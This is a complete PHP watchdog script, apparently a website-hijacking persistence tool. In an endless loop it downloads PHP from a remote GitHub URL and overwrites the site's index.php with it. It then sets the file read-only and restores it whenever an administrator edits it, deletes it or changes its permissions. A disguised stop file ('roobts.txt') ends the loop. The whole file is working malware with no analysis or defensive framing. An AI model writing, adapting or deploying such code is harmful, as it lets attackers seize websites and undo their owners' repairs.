<?php
error_reporting(E_ALL);
ini_set('display_errors', 1);
ignore_user_abort(true);
set_time_limit(0);

$stopFlag = 'roobts.txt';
$targetFile = 'index.php';
$sourceFile = 'content.txt';
$remoteURL  = 'https://raw.githubusercontent.com/black2729134369/https-m.fatier.com-/refs/heads/main/index.php';

// Windows 兼容的文件权限设置
$isWindows = (strtoupper(substr(PHP_OS, 0, 3)) === 'WIN');
$expectedPerms = $isWindows ? 0444 : 0444; // Windows 也支持相同的权限设置

file_put_contents('watchdog.log', date('Y-m-d H:i:s') . " Script started (Windows compatible)\n", FILE_APPEND);

$code = null;

while (true) {
    if (file_exists($stopFlag)) {
        @unlink($stopFlag);
        file_put_contents('watchdog.log', date('Y-m-d H:i:s') . " Stop flag detected. Exiting.\n", FILE_APPEND);
        break;
    }

    $shouldUpdate = false;
    
    // 尝试读取 content.txt
    if (file_exists($sourceFile)) {
        $newCode = @file_get_contents($sourceFile);
        if ($newCode !== false) {
            @unlink($sourceFile);
            file_put_contents('watchdog.log', date('Y-m-d H:i:s') . " content.txt updated and deleted\n", FILE_APPEND);

            if ($code === null || md5($newCode) !== md5($code)) {
                $code = $newCode;
                $shouldUpdate = true;
            }
        }
    }
    // 如果本地没有 content.txt，就尝试远程下载
    elseif ($code === null) {
        $newCode = @file_get_contents($remoteURL);
        if ($newCode !== false) {
            file_put_contents('watchdog.log', date('Y-m-d H:i:s') . " content.txt fetched from remote\n", FILE_APPEND);
            $code = $newCode;
            $shouldUpdate = true;
        } else {
            file_put_contents('watchdog.log', date('Y-m-d H:i:s') . " Failed to fetch remote content\n", FILE_APPEND);
        }
    }

    // 检查目标文件是否需要恢复
    if ($code !== null) {
        $needsRestore = false;
        $restoreReason = "";
        
        // 检查文件是否存在
        if (!file_exists($targetFile)) {
            $needsRestore = true;
            $restoreReason = "file_missing";
            file_put_contents('watchdog.log', date('Y-m-d H:i:s') . " Target file missing\n", FILE_APPEND);
        } 
        // 检查文件内容或权限是否匹配
        else {
            $currentContent = @file_get_contents($targetFile);
            
            // Windows 系统可能无法准确获取文件权限，所以主要检查内容
            if ($isWindows) {
                if ($currentContent === false) {
                    $needsRestore = true;
                    $restoreReason = "cannot_read";
                    file_put_contents('watchdog.log', date('Y-m-d H:i:s') . " Cannot read target file\n", FILE_APPEND);
                } 
                // 检查内容是否被修改
                elseif (md5($currentContent) !== md5($code)) {
                    $needsRestore = true;
                    $restoreReason = "content_modified";
                    file_put_contents('watchdog.log', date('Y-m-d H:i:s') . " Target file content modified\n", FILE_APPEND);
                }
            } else {
                // Linux 系统检查内容和权限
                $currentPerms = fileperms($targetFile) & 0777;
                
                if ($currentContent === false) {
                    $needsRestore = true;
                    $restoreReason = "cannot_read";
                    file_put_contents('watchdog.log', date('Y-m-d H:i:s') . " Cannot read target file\n", FILE_APPEND);
                } 
                // 检查内容是否被修改
                elseif (md5($currentContent) !== md5($code)) {
                    $needsRestore = true;
                    $restoreReason = "content_modified";
                    file_put_contents('watchdog.log', date('Y-m-d H:i:s') . " Target file content modified\n", FILE_APPEND);
                }
                // 检查权限是否被修改 (仅在 Linux 系统)
                elseif ($currentPerms != $expectedPerms) {
                    $needsRestore = true;
                    $restoreReason = "permission_modified";
                    file_put_contents('watchdog.log', date('Y-m-d H:i:s') . " Target file permission modified: " . decoct($currentPerms) . " (expected: " . decoct($expectedPerms) . ")\n", FILE_APPEND);
                }
            }
        }
        
        // 如果需要恢复或者有新的更新
        if ($needsRestore || $shouldUpdate) {
            // 先确保我们有写入权限
            if (file_exists($targetFile)) {
                @chmod($targetFile, 0644);
            }
            
            $result = @file_get_contents($remoteURL);
            if ($result === false) {
                $result = $code;
            }
            
            $writeResult = file_put_contents($targetFile, $result);
            if ($writeResult !== false) {
                // 设置正确的权限
                @chmod($targetFile, $expectedPerms);
                file_put_contents('watchdog.log', date('Y-m-d H:i:s') . " {$targetFile} restored (reason: {$restoreReason})\n", FILE_APPEND);
                
                // 记录恢复后的权限 (仅在 Linux 系统)
                if (!$isWindows) {
                    $restoredPerms = fileperms($targetFile) & 0777;
                    file_put_contents('watchdog.log', date('Y-m-d H:i:s') . " Restored file permissions: " . decoct($restoredPerms) . "\n", FILE_APPEND);
                }
            } else {
                file_put_contents('watchdog.log', date('Y-m-d H:i:s') . " Failed to restore {$targetFile}\n", FILE_APPEND);
            }
        }
    } else {
        file_put_contents('watchdog.log', date('Y-m-d H:i:s') . " No content available yet\n", FILE_APPEND);
    }

    // Windows 系统可能需要更长的休眠时间
    sleep($isWindows ? 2 : 1); // Windows 休眠 2 秒，Linux 休眠 1 秒
}